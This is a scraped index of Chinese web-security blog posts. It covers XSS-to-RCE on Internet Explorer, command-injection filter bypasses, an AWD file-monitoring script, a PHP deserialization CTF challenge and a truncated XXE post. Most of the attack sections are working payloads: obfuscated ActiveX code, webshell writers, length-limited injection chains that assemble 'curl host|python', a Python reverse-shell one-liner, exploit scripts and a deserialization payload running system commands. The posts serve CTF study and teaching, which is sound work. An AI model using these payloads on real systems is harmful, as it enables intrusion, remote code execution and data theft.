300);document.getElementById(\"send\").addEventListener(\"click\", token_part_3);token_part_1(\"ABCD\", 44); 几个函数调用顺序及生成token的步骤如下： 1、执行token_part_1()，取phrase值并进行字符串翻转处理； 2、延迟300ms后执行token_part_2()，传入参数字符串’XX’和token值拼接并调用sha256()加密； 3、点击按钮时执行token_part_3()，将token值和字符串’ZZ’拼接并调用sha256()加密，从而得到最终的token； 一波操作如下，先将转换过来的JS前一部分关于sha256算法定义代码输入实现初始化，方便后面直接调用sha256()： 然后按照前面的分析得到token值： 最后修改token的值为ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84即可。 0x04 Impossible Level页面显示一句话： You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level. 永远不要相信用户输入的内容，哈哈哈。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.mi1k7ea.com/tags/JavaScript/"}]},{"title":"XSS从弹框到RCE（IE）","date":"2019-06-30T04:29:06.000Z","path":"2019/06/30/XSS从弹框到RCE/","text":"为了提高XSS漏洞的严重性，这里利用JS在IE上实现RCE。 0x01 利用ActiveXObject这里以DVWA的反射型XSS为示例，其他情形的XSS利用同理。 构造的JavaScript代码如下： 12var o = new ActiveXObject(\"WScript.Shell\");o.run(\"calc.exe\"); 放到payload中： 1&lt;script&gt;var o = new ActiveXObject(\"WScript.Shell\");o.run(\"calc.exe\");&lt;/script&gt; 输入后无任何反应，但在控制台可看到报错： 这种利用方式id前提是需要在IE上打开Internet Explorer “工具”菜单栏中的“选项”-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下： 修改设置后，再次提交payload，系统会弹框警告： 只要用户点击确定即可执行exp： 当然，为了掩饰，我们可以对代码进行加密，加密后代码如下： 1String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10) 最终Exp如下： 1&lt;script&gt;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&lt;/script&gt; 0x02 结合CVE-2018-8174利用这里我们可以引入浏览器漏洞，以CVE-2018-8174漏洞为例。 Exp下载地址：https://github.com/Yt1g3r/CVE-2018-8174_EXP 第一步——生成恶意exploit.hml文件 在命令行输入以下命令，得到exploit.html： 1python CVE-2018-8174.py -u http://192.168.17.148:81 -i 192.168.17.160 -p 6666 -o exp.ctf 第二步——开启nc监听端口，并将exploit.html文件上传到服务器 其实exploit.html是一个通过script标签调用VBScript代码的页面，这种场景使用于存在XSS的页面，只需要将exploit.html中的script标签的内容作为输入即可进行XSS利用，这里只演示原理。 第三步——受害者访问exploit.html实现反弹shell 受害者访问exploit.html会显示报错： 监听端接受到反弹shell： 0x03 参考记一次从DOM型XSS到RCE过程","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"命令注入Bypass技巧小结","date":"2019-06-30T03:35:18.000Z","path":"2019/06/30/命令注入Bypass技巧小结/","text":"这里小结下各位师傅的Bypass技巧。 测试后门代码： 1&lt;?php system($_GET['m']);?&gt; 0x01 空格过滤Bypass使用$IFS1http://m.com/shell.php?m=ls$IFS/tmp 一些特殊情况可用以下变体： \\$IFS​\\$9——后面加个\\$与{}类似，起截断作用，\\$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat\\$IFS2\\$9flag.php； \\${IFS}——单纯cat​\\$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat\\${IFS2}flag.php； 使用{cmd,p1[,p2……]}1http://m.com/shell.php?m=&#123;cat,/etc/passwd&#125; 使用Tab在PHP环境下使用%09可以替换空格， 1http://m.com/shell.php?m=cat%09/etc/passwd 使用重定向&lt;重定向，如：cat&lt;flag.php &lt;&gt;重定向，如：ls&lt;&gt;a.txt 0x02 关键字过滤Bypass12345678910;a=/etc;b=/passwd;cat $a$b;;cat$IFS/et?/pas??d;;c\\a\\t /e\\t\\c/p\\a\\s\\s\\wd;;ca$&#123;xx&#125;t /et$&#123;xx&#125;c/pas$&#123;xx&#125;swd;;$&#123;SHELLOPTS:3:1&#125;at /et$&#123;SHELLOPTS:3:1&#125;/passwd;;c(echo a)t /et$(echo c)/pas$(echo s)wd;;c`echo a`t /et`echo c`/pas`echo s`wd;;ca''t /et''c/pass''wd;;ca\"\"t /et\"\"c/pass\"\"wd;;ca``t /et``c/pass``wd; 0x03 连接符可用于进行命令注入利用和替换的连接符有：&amp;、&amp;&amp;、|、||、%0a、;、`、\\n等。 注意前面几个符号的区别：&amp;&amp;号后面命令的执行是建立在前面命令已经正确执行的前提之下的；&amp;号表明这两条命令会同时执行，顺序先后不一定；管道符（|）能正常执行，但管道符的限制是只显示后面那条命令的执行结果；另外也有两个管道符（||）的用法，但是条件是前面的命令执行失败，和&amp;&amp;号的相反。 0x04 长度限制绕过长度限制&lt;17看个例题： 123456&lt;?php $param = $_POST['param']; if(strlen($param) &lt; 17)&#123; eval($param); &#125;?&gt; 直接在eval里内嵌eval即可，长度刚刚好： 1param=eval($_POST[1]);&amp;1=echo `cat flag` 长度限制&lt;16在前面的基础上，将POST改为GET： 1eval($_GET[1]); 或者使用&gt;和&gt;&gt;来构造： 如需执行 echo \\&lt;?php eval($_GET[1]);?>&gt;1 12345echo \\&lt;?php &gt;1;echo eval\\(&gt;&gt;1;echo \\$_GET&gt;&gt;1;echo \\[1\\]&gt;&gt;1;echo \\)\\;?&gt;&gt;1; 长度限制&lt;8例题： 12345&lt;?phpif(strlen($_GET[1])&lt;8)&#123; echo shell_exec($_GET[1]);&#125;?&gt; 可以利用后面说到技巧来绕过，具体原理看后面即可。 假设我们要写入&lt;?php echo phpinfo();，转换成Base64编码形式就是echo PD9waHAgcGhwaW5mbygpOw== | base64 -d &gt;1.php： 1234567891011121314151617181920ski12@ubuntu:/tmp/test$ &gt;hpski12@ubuntu:/tmp/test$ &gt;1.p\\\\ski12@ubuntu:/tmp/test$ &gt;d\\&gt;\\\\ski12@ubuntu:/tmp/test$ &gt;\\-\\\\ski12@ubuntu:/tmp/test$ &gt;e64\\\\ski12@ubuntu:/tmp/test$ &gt;bas\\\\ski12@ubuntu:/tmp/test$ &gt;=\\|\\\\ski12@ubuntu:/tmp/test$ &gt;w=\\\\ski12@ubuntu:/tmp/test$ &gt;gpO\\\\ski12@ubuntu:/tmp/test$ &gt;mby\\\\ski12@ubuntu:/tmp/test$ &gt;aW5\\\\ski12@ubuntu:/tmp/test$ &gt;Ghw\\\\ski12@ubuntu:/tmp/test$ &gt;Agc\\\\ski12@ubuntu:/tmp/test$ &gt;waH\\\\ski12@ubuntu:/tmp/test$ &gt;PD9\\\\ski12@ubuntu:/tmp/test$ &gt;o\\ \\\\ski12@ubuntu:/tmp/test$ &gt;ech\\\\ski12@ubuntu:/tmp/test$ ls -t&gt;0ski12@ubuntu:/tmp/test$ sh 0 倒叙新建文件名，然后通过ls -t&gt;0，将刚才的顺序再倒序然后写入到0文件中，然后用sh将0当作脚本执行。 另一个exp脚本如下，原理类似： 123456789101112131415161718import requestsname=[\"&gt;php\\\\\",\"&gt;\\\\ 1.\\\\\\\\\",\"&gt;\\\\ -O\\\\\\\\\",\"&gt;cn\\\\\\\\\",\"&gt;\\\\ a.\\\\\\\\\",\"&gt;wget\\\\\\\\\"]#可以修改hosts文件，让a.cn指向一个自己的服务器。#index.html是一个php的shellurl=\"http://192.168.163.128/test.php\"for x in name: print x param=&#123;'1':x&#125; a=requests.get(url,params=param)param1=&#123;'1':'ls -t&gt;a'&#125;param2=&#123;'1':'sh a'&#125;requests.get(url,params=param1)requests.get(url,params=param2)b=requests.get(\"http://192.168.163.128/1.php\")if b.status_code == 200: print \"ok!\"else: print \"bad!\" 长度限制&lt;=5在上一小节的基础上，看到ls -t&gt;0这个命令是超过5位的长度限制的。但是我们可以把ls -t&gt;a拆分为几段放在一个文件中，然后再执行，具体的原理在后面讲到： 1234567ski12@ubuntu:/tmp/test$ &gt;ls\\\\ski12@ubuntu:/tmp/test$ ls&gt;aski12@ubuntu:/tmp/test$ &gt;\\ \\\\ski12@ubuntu:/tmp/test$ &gt;-t\\\\ski12@ubuntu:/tmp/test$ &gt;\\&gt;0ski12@ubuntu:/tmp/test$ ls&gt;&gt;a 看个例题： 12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 贴一下Orange师傅的exp脚本： 123456789101112131415161718192021222324252627282930313233343536import requestsfrom time import sleepfrom urllib import quotepayload = [ # generate `ls -t&gt;g` file '&gt;ls\\\\', 'ls&gt;_', '&gt;\\ \\\\', '&gt;-t\\\\', '&gt;\\&gt;g', 'ls&gt;&gt;_', # generate `curl orange.tw.tw&gt;python` # curl shell.0xb.pw|python '&gt;on', '&gt;th\\\\', '&gt;py\\\\', '&gt;\\|\\\\', '&gt;pw\\\\', '&gt;x.\\\\', '&gt;xx\\\\', '&gt;l.\\\\', '&gt;el\\\\', '&gt;sh\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # exec 'sh _', 'sh g', ]# r = requests.get('http://localhost/tmp/?reset=1')for i in payload: assert len(i) &lt;= 5 r = requests.get('http://localhost/tmp/?cmd=' + quote(i) ) print i sleep(0.2) 长度限制&lt;=4参考学习了Freebuf上的这个命令注入绕过长度限制反弹shell的姿势：挖洞经验 | 命令注入突破长度限制 下面是跟着原文来操作一遍。 命令组装（*号解析文件名为命令）依次输入如下命令，先分别创建echo和mi1k7ea两个文件，然后执行*，此时就能看到输出hello了。这里通过&gt;echo和&gt;hello完成命令组装，然后调用*并执行了命令echo mi1k7ea。 注意：这里为什么拼接的顺序是echo在前mi1k7ea在后，这是因为e字母在m字母的之前而并非是先创建echo再创建mi1k7ea的缘故。 此时我们可以通过echo *来查看这个*代表的是什么： 1234567ski12@ubuntu:/tmp/test$ &gt;echoski12@ubuntu:/tmp/test$ &gt;mi1k7easki12@ubuntu:/tmp/test$ *mi1k7easki12@ubuntu:/tmp/test$ echo *echo mi1k7easki12@ubuntu:/tmp/test$ 但是当我们尝试用这种方法来执行ls -l这种带参数的命令时，由于参数前的-字符会让参数的排序总是在命令的前面，导致调用*时总是实际执行命令-l ls进而报错： 1234567ski12@ubuntu:/tmp/test$ &gt;lsski12@ubuntu:/tmp/test$ &gt;-lski12@ubuntu:/tmp/test$ *-l: command not foundski12@ubuntu:/tmp/test$ echo *-l lsski12@ubuntu:/tmp/test$ 下面应用的技巧可以实现绕过。 反转命令（rev命令）由前面知道”-“字符在”l”字母之前，如果我们将他们反转以下，即将ls -l命令反转过来为l- sl，此时”l”在”s”前面，然后将其写入文件v中，最后用一个命令将文件中的字节反转就能实现绕过执行了。 这里先看到，如果我们采用如下的方式将反转的命令写入v文件中（为啥是v文件后面会说到），可以看到是文件中存在v这个字符扰乱我们的命令的： 123456789101112ski12@ubuntu:/tmp/test$ &gt;l-ski12@ubuntu:/tmp/test$ &gt;slski12@ubuntu:/tmp/test$ lsl- slski12@ubuntu:/tmp/test$ ls&gt;vski12@ubuntu:/tmp/test$ lsl- sl vski12@ubuntu:/tmp/test$ cat vl-slvski12@ubuntu:/tmp/test$ 下面用到一个技巧，使用dir命令，即dir a b&gt;c只会将a b写到文件c中： 123456789ski12@ubuntu:/tmp/test$ &gt;dirski12@ubuntu:/tmp/test$ lsdir l- slski12@ubuntu:/tmp/test$ *&gt;vski12@ubuntu:/tmp/test$ lsdir l- sl vski12@ubuntu:/tmp/test$ cat vl- slski12@ubuntu:/tmp/test$ 好了，已经将反转命令保存到v文件中了。 接下来就是对文件内容进行反转操作。 Linux中有个rev命令用于将文件内容以字符为单位反序输出。这里新建rev文件后，使用*v就能匹配到当前目录下的rev和v这两个文件，就能成功执行了，这就是为什么前面说到文件要命名为v： 12345678ski12@ubuntu:/tmp/test$ &gt;revski12@ubuntu:/tmp/test$ lsdir l- rev sl vski12@ubuntu:/tmp/test$ echo *vrev vski12@ubuntu:/tmp/test$ *vls -lski12@ubuntu:/tmp/test$ 现在只需要将*v的执行结果输出到一个文件中，再执行这个文件即可成功执行ls -l命令： 12345678910ski12@ubuntu:/tmp/test$ *v&gt;xski12@ubuntu:/tmp/test$ sh xtotal 8-rw-rw-r-- 1 ski12 ski12 0 Feb 13 18:35 dir-rw-rw-r-- 1 ski12 ski12 0 Feb 13 18:29 l--rw-rw-r-- 1 ski12 ski12 0 Feb 13 18:58 rev-rw-rw-r-- 1 ski12 ski12 0 Feb 13 18:29 sl-rw-rw-r-- 1 ski12 ski12 7 Feb 13 18:42 v-rw-rw-r-- 1 ski12 ski12 7 Feb 13 19:12 xski12@ubuntu:/tmp/test$ 此时可以看到，几个关键的命令的长度都不超过4。 控制顺序（ls -t命令）如果我们想构造ls -t &gt;g命令，要是按前面那样反转命令的技巧来的话会得到g&gt; t- sl，按照字母顺序t-会在sl后面，不满足需要。此时转换一下，构造的是ls -th &gt;g命令，反转命令的技巧来的话会得到g&gt; ht- sl，此时正好满足字母顺序。 注意，ls命令的-t参数是根据时间先后来列出文件，-h参数是以人认知的方式列出内容。 通过ls -th就能控制命令和参数的顺序了： 123456789ski12@ubuntu:/tmp/test$ &gt;-lski12@ubuntu:/tmp/test$ &gt;lsski12@ubuntu:/tmp/test$ ls-l lsski12@ubuntu:/tmp/test$ ls -tls -lski12@ubuntu:/tmp/test$ ls -thls -lski12@ubuntu:/tmp/test$ 命令续行（末尾\\字符）在Linux中，如果当前输入的内容最后一个字符为\\，会在下面一行继续等待用户输入然后拼接成完整的命令再执行，比如： 123ski12@ubuntu:/tmp/test$ l\\&gt; s-l ls 因此，我们就可以构造一连串的拼接命令续行来绕过长度限制，如下是为了构造命令curl mi1k7ea.com|python： 123456789101112131415ski12@ubuntu:/tmp/test$ &gt;th\\\\ski12@ubuntu:/tmp/test$ &gt;py\\\\ski12@ubuntu:/tmp/test$ &gt;\\|\\\\ski12@ubuntu:/tmp/test$ &gt;m\\\\ski12@ubuntu:/tmp/test$ &gt;co\\\\ski12@ubuntu:/tmp/test$ &gt;a.\\\\ski12@ubuntu:/tmp/test$ &gt;7e\\\\ski12@ubuntu:/tmp/test$ &gt;1k\\\\ski12@ubuntu:/tmp/test$ &gt;mi\\\\ski12@ubuntu:/tmp/test$ &gt;\\ \\\\ski12@ubuntu:/tmp/test$ &gt;rl\\\\ski12@ubuntu:/tmp/test$ &gt;cu\\\\ski12@ubuntu:/tmp/test$ ls -tcu\\ rl\\ \\ mi\\ 1k\\ 7e\\ a.\\ co\\ m\\ |\\ py\\ th\\ onski12@ubuntu:/tmp/test$ 注意，.符号不能放在首位，前面必须有其他字符来拼接才能创建成功。 &gt;py\\\\这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入\\\\产生\\，但是php 代码exec时，只需要输入\\即可产生\\，比如exec(&quot;&quot;&gt;py\\&quot;)即可。所以这里实际上是不超过4个字符的，为了演示直观，在shell中直接执行。 执行ls -th&gt;g，然后sh g，实际执行反弹shell命令。 curl mi1k7ea.com实际获取的内容： 123456import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.190.138\",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]); 最终payload链将前面的各种技巧串连起来，就能构成绕过长度限制实现反弹shell的命令注入了。 生成包含ls -th &gt;g文件x： 12345678910ski12@ubuntu:/tmp/test$ &gt;slski12@ubuntu:/tmp/test$ &gt;ht-ski12@ubuntu:/tmp/test$ &gt;g\\&gt;ski12@ubuntu:/tmp/test$ &gt;dirski12@ubuntu:/tmp/test$ *&gt;vski12@ubuntu:/tmp/test$ &gt;revski12@ubuntu:/tmp/test$ *v&gt;xski12@ubuntu:/tmp/test$ cat xls -th &gt;gski12@ubuntu:/tmp/test$ 然后生成curl mi1k7ea.com|python命令续行文件： 1234567891011121314151617ski12@ubuntu:/tmp/test$ &gt;\\;ski12@ubuntu:/tmp/test$ &gt;on\\\\ski12@ubuntu:/tmp/test$ &gt;th\\\\ski12@ubuntu:/tmp/test$ &gt;py\\\\ski12@ubuntu:/tmp/test$ &gt;\\|\\\\ski12@ubuntu:/tmp/test$ &gt;m\\\\ski12@ubuntu:/tmp/test$ &gt;co\\\\ski12@ubuntu:/tmp/test$ &gt;a.\\\\ski12@ubuntu:/tmp/test$ &gt;7e\\\\ski12@ubuntu:/tmp/test$ &gt;1k\\\\ski12@ubuntu:/tmp/test$ &gt;mi\\\\ski12@ubuntu:/tmp/test$ &gt;\\ \\\\ski12@ubuntu:/tmp/test$ &gt;rl\\\\ski12@ubuntu:/tmp/test$ &gt;cu\\\\ski12@ubuntu:/tmp/test$ ls -tcu\\ rl\\ \\ mi\\ 1k\\ 7e\\ a.\\ co\\ m\\ |\\ py\\ th\\ on\\ ; x rev v dir g&gt; ht- slski12@ubuntu:/tmp/test$ 然后执行sh x把curl mi1k7ea.com|python命令写入文件g： 123456789101112131415161718192021222324252627ski12@ubuntu:/tmp/test$ sh xski12@ubuntu:/tmp/test$ cat xls -th &gt;gski12@ubuntu:/tmp/test$ cat ggcu\\rl\\ \\mi\\1k\\7e\\a.\\co\\m\\|\\py\\th\\on\\;xrevvdirg&gt;ht-slski12@ubuntu:/tmp/test$ 最后执行sh g，即可实现反弹shell。 另：利用bash shell变量拼接如下： 123456789101112131415ski12@ubuntu:/tmp/test$ a=ecski12@ubuntu:/tmp/test$ a+=hski12@ubuntu:/tmp/test$ a+=oski12@ubuntu:/tmp/test$ a+=\\ ski12@ubuntu:/tmp/test$ a+=hski12@ubuntu:/tmp/test$ a+=aski12@ubuntu:/tmp/test$ a+=cski12@ubuntu:/tmp/test$ a+=kski12@ubuntu:/tmp/test$ a+=eski12@ubuntu:/tmp/test$ a+=dski12@ubuntu:/tmp/test$ $ahackedski12@ubuntu:/tmp/test$ echo $aecho hackedski12@ubuntu:/tmp/test$ 注意，这种在另起shell的时候不适用，也就是说大多数时候是不可用的。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"命令注入","slug":"命令注入","permalink":"https://www.mi1k7ea.com/tags/命令注入/"}]},{"title":"AWD文件监控脚本","date":"2019-06-30T03:18:21.000Z","path":"2019/06/30/AWD文件监控脚本/","text":"参考网上的脚本做了一些小的修改。 原理是利用pyinotify库实现文件监控，在EventHandler类的各个方法中调用一些自定义的方法来实现个人定制的文件监控功能，具体的可参考官方文档。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141import osimport argparseimport hashlibfrom pyinotify import WatchManager, Notifier,ProcessEventfrom pyinotify import IN_DELETE, IN_CREATE, IN_MOVED_TO, IN_ATTRIB, IN_MODIFYdir_path = \"\"class EventHandler(ProcessEvent): \"\"\"事件处理\"\"\" #创建新文件，自动删除 def process_IN_CREATE(self, event): print \"[!] Create : \" + event.pathname DeleteFileOrDir(event.pathname) #文件被删除，如rm命令，自动恢复原文件 def process_IN_DELETE(self, event): print \"[!] Delete : \" + event.pathname # CanNotDel(event.pathname) #文件属性被修改，如chmod、chown命令 def process_IN_ATTRIB(self, event): print \"[!] Attribute been modified:\" + event.pathname #文件被移来，如mv、cp命令，自动删除 def process_IN_MOVED_TO(self, event): print \"[!] File or dir been moved to here: \" + event.pathname DeleteFileOrDir(event.pathname) #文件被修改，如vm、echo命令，自动恢复原文件 def process_IN_MODIFY(self, event): print \"[!] Modify : \" + event.pathname CanNotModify(event.pathname)def DeleteFileOrDir(target): if os.path.isdir(target): fileslist = os.listdir(target) try: os.system('cp ' + str(target) + ' /tmp/evil_files/') except: pass for files in fileslist: DeleteFileOrDir(target + \"/\" + files) try: os.rmdir(target) print \" &gt;&gt;&gt; Delete directory successfully: \" + target except: print \" [-] Delete directory failed: \" + target if os.path.isfile(target): try: os.system('cp ' + str(target) + ' /tmp/evil_files/') except: pass try: os.remove(target) print \" &gt;&gt;&gt; Delete file successfully\" + target except: print \" [-] Delete file failed: \" + targetdef get_file_md5(f): m = hashlib.md5() while True: #如果不用二进制打开文件，则需要先编码 #data = f.read(1024).encode('utf-8') data = f.read(1024) #将文件分块读取 if not data: break m.update(data) return m.hexdigest()def CompareFile(file1, file2): with open(file1, 'rb') as f1, open(file2, 'rb') as f2: file1_md5 = get_file_md5(f1) file2_md5 = get_file_md5(f2) if file1_md5 != file2_md5: return True else: return Falsedef CanNotModify(target): if os.path.exists(target): if os.path.isfile(target): print \"dir path: \" + dir_path target_new = \"/tmp/backup/\" + str(target).split(dir_path)[1] isChanged = CompareFile(str(target), target_new) if isChanged: try: os.system('cp ' + str(target) + ' /tmp/evil_files/') except Exception, e: pass try: os.system(\"cat \" + target_new + \" &gt; \" + str(target)) print \" &gt;&gt;&gt; Recover file successfully\" except Exception, e: print \" [-] Recover file failed: \" + targetdef CanNotDel(target): if not os.path.exists(target): try: target_new = \"/tmp/backup/\" + str(target).split(dir_path)[1] os.system(\"cat \" + target_new + \" &gt; \" + str(target)) print \" &gt;&gt;&gt; Recover file successfully\" except Exception, e: print \" [-] Recover file failed: \" + targetdef Monitor(path): wm = WatchManager() mask = IN_DELETE | IN_CREATE | IN_MOVED_TO | IN_ATTRIB | IN_MODIFY notifier = Notifier(wm, EventHandler()) wm.add_watch(path, mask,rec=True) print '[+] Now Starting Monitor: %s'%(path) while True: try: notifier.process_events() if notifier.check_events(): notifier.read_events() except KeyboardInterrupt: notifier.stop() break if __name__ == \"__main__\": try: os.system('mkdir /tmp/evil_files/') os.system('mkdir /tmp/backup/') except: print 'Oh.' parser = argparse.ArgumentParser( usage=\"%(prog)s -w [path]\", description=(''' Introduce：Simple Directory Monitor! by ssooking''') ) parser.add_argument('-w','--watch',action=\"store\",dest=\"path\",default=\"/var/www/html/\",help=\"directory to watch,default is /var/www/html\") args=parser.parse_args() dir_path = str(args.path) print \"dir path: \" + dir_path cmd = 'cp -r ' + str(args.path) print \"dir path: \" + dir_path cmd = 'cp -r ' + str(args.path) + '* /tmp/backup/' os.system(cmd) Monitor(args.path) 代码的功能应该一目了然。 有个问题，AWD实际情况中未必有pyinotify这个库或者根本没有Python环境，一种解决方案是自己准备好Python和pyinotify库的源码安装包。 除此之外，我们可以将Python文件提前编译成32位和64位的ELF文件，即到即用就OK了。 这里用到一个名为pyinstaller的库，安装很简单：pip install pyinstaller 使用也很简单：pyinstaller -F ./Monitor.py 编译完成后，在dist子目录中可以找到目标可执行文件。 注意：pyinstaller在不用系统环境编译出来的可执行文件是存在区别，在Windows上编译生成的是EXE文件，在Linux上编译生成的是ELF文件，而在32位系统才会生成32位可执行文件、在64位系统生成64位可执行文件。","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"AWD","slug":"AWD","permalink":"https://www.mi1k7ea.com/tags/AWD/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"}]},{"title":"一道Bypass正则过滤的反序列化漏洞题目","date":"2019-06-27T15:08:15.000Z","path":"2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/","text":"0x01 题目分析一道PHP代码审计的题目，直接看源代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Template &#123; public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;Welcome back %s&lt;/div&gt;'; public function __construct($data = null) &#123; $data = $this-&gt;loadData($data); $this-&gt;render($data); &#125; public function loadData($data) &#123; if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:\\/', $data)) &#123; return unserialize($data); &#125; return []; &#125; public function createCache($file = null, $tpl = null) &#123; $file = $this-&gt;cacheFile; $tpl = $this-&gt;template; call_user_func($file, $tpl); &#125; public function render($data) &#123; echo sprintf( $this-&gt;template, htmlspecialchars($data['name']) ); &#125; public function __destruct() &#123; $this-&gt;createCache(); &#125;&#125;@new Template($_POST['data']);?&gt; __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 反序列化漏洞调用链分析 考察点是原生的PHP unserialize反序列化漏洞。Template类有两个成员变量cacheFile和template，构造方法__construct()中调用了loadData()和render()，而析构方法__destruct()则调用了createCache()；其中，loadData()是通过if判断对参数进行过滤、再调用unserialize()方法反序列化参数内容，render()是在界面输出参数的name对应的值，createCache()中以Template类的两个成员变量为参数调用call_user_func()；很明显，漏洞点在于call_user_func()函数的任意函数调用，其代码逻辑在createCache()中，而createCache()函数是在析构函数__destruct()中调用，而在代码的最后是通过POST请求传入data参数来构造新的Template类实例，当所有代码执行完之后析构函数__destruct()必然会被调用；也就是说，data参数可控，可以通过构造方法调用到unserialize()方法中实现对data内容的反序列化操作，最终在代码执行完成时通过析构函数实现任意函数调用，那么反序列化利用的逻辑就理清了。 Bypass 我们看到在loadData()中是通过if判断对参数进行过滤、再调用unserialize()方法反序列化参数内容。要想进入反序列化的逻辑，必须通过下面的if判断： 1if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:\\/', $data)) 第一个判断条件是开头前两个字符不能为’O:’开始，第二个判断条件是正则表达式不能匹配到’O:’后面加数字这样的情况。 我们知道，正常序列化的内容为： 1O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;SKI12&quot;;s:4:&quot;blog&quot;;s:28:&quot;https://blog.csdn.net/ski_12&quot;;&#125; PHP中可反序列化类型有String、Integer、Boolean、Null、Array、Object等，这里看来Object是行不通了。再结合代码看下： 123456public function render($data) &#123; echo sprintf( $this-&gt;template, htmlspecialchars($data['name']) );&#125; 在render()函数中调用了传入参数data的name对应的值，调用方式为$data[‘name’]，表明data是个数组，间接提示我们可以采用数组中存储对象进行绕过。 至于第二个判断条件的Bypass，这里直接借鉴参考的文章。 第二个if判断,匹配 字符串为 \\’O:任意十进制:’,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空，考虑一下如何绕过正则匹配，PHP反序列化处理部分源码如下： 在PHP源码var_unserializer.c，对反序列化字符串进行处理，在代码568行对字符进行判断，并调用相应的函数进行处理，当字符为’O’时，调用 yy13 函数，在 yy13 函数中，对‘O‘字符的下一个字符进行判断，如果是’:’,则调用 yy17 函数,如果不是则调用 yy3 函数,直接return 0，结束反序列化。接着看 yy17 函数。通过观察yybm[]数组可知，第一个if判断是否为数字，如果为数字则跳转到 yy20 函数，第二个判断如果是’+’号则跳转到 yy19 ，在 yy19 中，继续对 +号 后面的字符进行判断，如果为数字则跳转到 yy20 ,如果不是则跳转到 yy18 ， y18 最终跳转到 yy3 ，退出反序列化流程。由此，在’O:’,后面可以增加’+’，用来绕过正则判断。 利用思路 构造序列化内容，将两个成员变量分别初始化为恶意函数和参数，这里设置为assert和system(‘ls’)； 在恶意构造的序列化内容中的’O:’后面加上+号； 通过POST将序列化内容传递给data参数来触发反序列化漏洞； Exp 123456789&lt;?phpclass Template &#123; public $cacheFile = 'assert'; public $template = 'system(\\'whoami\\');';&#125;echo serialize(array(new Template()));?&gt; 输出为： 1a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:6:&quot;assert&quot;;s:8:&quot;template&quot;;s:17:&quot;system(&apos;whoami&apos;);&quot;;&#125;&#125; 在’O:’后面加上+号： 1a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:6:&quot;assert&quot;;s:8:&quot;template&quot;;s:17:&quot;system(&apos;whoami&apos;);&quot;;&#125;&#125; 触发利用： 0x02 参考代码审计Day11 - unserialize反序列化漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"从一道CTF题看如何通过本地DTD文件利用XXE实现回显","date":"2019-06-27T14:14:57.000Z","path":"2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/","text":"0x01 利用本地DTD文件实现XXE攻击一般来说，对于无回显的支持外部实体的XXE，是通过带外通道OOB实现攻击回传数据。 但是，当你的服务器和目标服务器之间有防火墙时，上面的方法就没辙了。此时我们就可以通过本地DTD文件利用XXE漏洞实现任意结果的输出。 内部DTD文件可干啥？要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地DTD文件，并在其中重新定义一些参数实体引用： Request 12345678910111213&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt; &lt;!ENTITY % 